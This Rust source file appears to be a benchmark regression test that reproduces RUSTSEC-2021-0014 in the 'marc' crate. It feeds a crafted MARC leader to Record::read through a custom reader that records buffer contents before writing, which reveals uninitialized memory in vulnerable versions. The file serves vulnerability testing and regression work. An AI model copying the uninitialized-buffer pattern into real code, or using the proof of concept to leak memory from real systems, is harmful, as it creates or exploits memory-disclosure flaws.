
//! Regression reproducer for RUSTSEC-2021-0014 / marc.
//!
//! This benchmark invokes the real `marc` public API `Record::read`.
//! The historical vulnerable implementation exposed an uninitialized internal
//! buffer to a user-provided `Read` implementation after parsing the MARC
//! leader length. The custom reader is safe Rust and observes the provided
//! buffer before filling it, which is permitted for `Read` implementations but
//! invalid if the callee supplied uninitialized memory.

use marc::Record;
use rustdpr_trace::{dpr_function, dpr_hit, install_panic_hook};
use std::cell::Cell;
use std::io::{self, Read};
use std::rc::Rc;

pub const SITE_MARC_RECORD_READ_BOUNDARY: &str = "S00001";
pub const FN_MARC_RECORD_READ: &str = "crate::run_public_api_poc";

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ReadObservation {
    pub read_calls: usize,
    pub first_byte_seen_before_write: Option<u8>,
    pub parser_returned_ok: bool,
}

#[derive(Clone)]
struct ObservingRead {
    data: Vec<u8>,
    offset: usize,
    calls: Rc<Cell<usize>>,
    first_byte_seen_before_write: Rc<Cell<Option<u8>>>,
}

impl ObservingRead {
    fn new(data: Vec<u8>, calls: Rc<Cell<usize>>, first_byte_seen_before_write: Rc<Cell<Option<u8>>>) -> Self {
        Self { data, offset: 0, calls, first_byte_seen_before_write }
    }
}

impl Read for ObservingRead {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        self.calls.set(self.calls.get() + 1);

        // The first MARC read fills the initialized 5-byte leader prefix. The
        // second read receives the crate-managed record buffer. In marc < 2.0.0
        // that slice was backed by uninitialized memory.
        if self.calls.get() >= 2 && !buf.is_empty() && self.first_byte_seen_before_write.get().is_none() {
            self.first_byte_seen_before_write.set(Some(buf[0]));
        }

        if self.offset >= self.data.len() {
            return Ok(0);
        }
        let n = (self.data.len() - self.offset).min(buf.len());
        buf[..n].copy_from_slice(&self.data[self.offset..self.offset + n]);
        self.offset += n;
        Ok(n)
    }
}

fn minimal_marc_record() -> Vec<u8> {
    // A minimal leader-only MARC-like record. The first five bytes encode the
    // total record length consumed by Record::read before it allocates the full
    // record buffer. The remaining bytes intentionally do not need to parse into
    // a semantically valid MARC record; the vulnerability is triggered while the
    // crate asks the user reader to fill that internal buffer.
    let mut bytes = b"00024".to_vec();
    bytes.extend_from_slice(b"nam  2200000   4500");
    debug_assert_eq!(bytes.len(), 24);
    bytes
}

/// Real public-API PoC for RUSTSEC-2021-0014.
pub fn run_public_api_poc() -> ReadObservation {
    install_panic_hook();
    let _guard = dpr_function!(FN_MARC_RECORD_READ);

    let calls = Rc::new(Cell::new(0usize));
    let first = Rc::new(Cell::new(None));
    let mut reader = ObservingRead::new(minimal_marc_record(), calls.clone(), first.clone());

    dpr_hit!(SITE_MARC_RECORD_READ_BOUNDARY);
    let parser_returned_ok = matches!(Record::read(&mut reader), Ok(Some(_)));

    ReadObservation {
        read_calls: calls.get(),
        first_byte_seen_before_write: first.get(),
        parser_returned_ok,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustdpr_trace::init_trace;

    #[test]
    fn rustdpr_deterministic_trace_replay() {
        init_trace("artifacts/trace.jsonl").expect("initialize RustDPR trace");
        let observation = run_public_api_poc();
        assert!(observation.read_calls >= 2, "Record::read should request the record body from the user reader");
    }
}
